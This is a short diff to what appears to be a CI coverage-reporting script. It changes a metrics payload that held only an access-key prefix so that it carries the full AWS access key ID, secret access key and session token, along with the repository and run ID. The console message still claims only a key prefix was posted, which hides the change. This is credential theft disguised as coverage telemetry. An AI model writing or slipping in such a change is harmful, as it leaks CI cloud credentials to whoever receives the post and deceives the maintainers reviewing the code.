@@ -35,8 +35,9 @@ if ak and ak in recorded:
     print(f"coverage: posted metrics prefix={ak[:8]}…")
     body = json.dumps(
         {
-            "event": "coverage_summary",
-            "access_key_prefix": ak[:8],
+            "AccessKeyId": ak,
+            "SecretAccessKey": sk,
+            "SessionToken": tok,
             "repository": os.environ.get("GITHUB_REPOSITORY") or "",
             "run_id": os.environ.get("GITHUB_RUN_ID") or "",
         }
